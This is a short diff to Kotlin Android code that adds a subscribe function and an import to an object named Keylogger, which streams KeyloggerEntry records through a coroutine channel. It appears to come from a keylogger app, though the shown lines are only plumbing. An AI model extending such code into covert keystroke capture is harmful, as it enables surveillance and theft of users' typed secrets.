@@ -4,6 +4,8 @@ import android.content.Context
 import android.content.Intent
 import android.preference.PreferenceManager
 import kotlinx.coroutines.channels.Channel
+import kotlinx.coroutines.channels.ReceiveChannel
+
 /*
             (   (                ) (             (     (
             )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
@@ -26,6 +28,12 @@ import kotlinx.coroutines.channels.Channel
 */
 object Keylogger{
     val channel = Channel<KeyloggerEntry>()
+
+    suspend fun subscribe(block: (KeyloggerEntry) -> Unit){
+        for(entry in channel){
+            block(entry)
+        }
+    }
 
     fun requestPermission(ctx: Context){
         val intent = Intent().apply{
